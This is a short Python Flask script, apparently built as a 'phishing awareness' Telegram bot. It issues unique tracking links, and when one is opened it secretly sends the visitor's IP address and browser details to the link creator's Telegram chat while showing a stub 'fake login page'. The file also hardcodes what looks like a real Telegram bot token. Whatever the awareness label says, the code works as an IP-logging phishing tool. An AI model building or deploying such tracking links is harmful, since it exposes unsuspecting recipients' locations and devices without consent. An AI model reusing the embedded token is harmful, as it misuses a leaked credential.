from flask import Flask, request
import telegram
import os

app = Flask(__name__)

# BOT TOKEN directly in code (not recommended for public use)
BOT_TOKEN = "6003025515:AAGaHvoCG9hHpVHS2KvE0ivmdtAJEzI5h7k"
bot = telegram.Bot(token=BOT_TOKEN)

user_links = {}

@app.route('/')
def index():
    return 'Phishing Awareness Bot Active.'

@app.route('/start/<user_id>')
def phishing_page(user_id):
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    if user_id in user_links:
        chat_id = user_links[user_id]
        bot.send_message(chat_id=chat_id, text=f"🎯 Visit detected!\nIP: {ip}\nBrowser: {user_agent}")
    return '<h1>This is a fake login page (for awareness demo)</h1>'

@app.route('/register/<int:chat_id>')
def register(chat_id):
    unique_id = str(chat_id)[-6:]
    user_links[unique_id] = chat_id
    return f"Your link: https://yourrenderapp.onrender.com/start/{unique_id}"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
